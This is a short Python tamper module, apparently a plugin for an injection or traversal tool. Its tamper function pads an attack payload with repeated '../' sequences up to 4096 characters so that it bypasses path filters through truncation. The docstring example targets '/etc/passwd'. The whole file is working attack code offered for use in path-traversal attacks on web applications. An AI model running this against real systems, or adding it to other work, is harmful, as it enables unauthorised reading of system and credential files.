
import sys
from main_modules.settings import PRIORITY, TYPE
__classificationtype__=TYPE.UNIVERSAL
__priority__ = PRIORITY.LOWEST


def tamper(payload, **kwargs):
    """
    

    >>> /etc/passwd/../../../../../../../../../../[4096 plus tard]/. 
    """
    repeat_el='../'

    while len(payload)<4096:
        payload=payload+repeat_el


    return (payload) if payload else payload
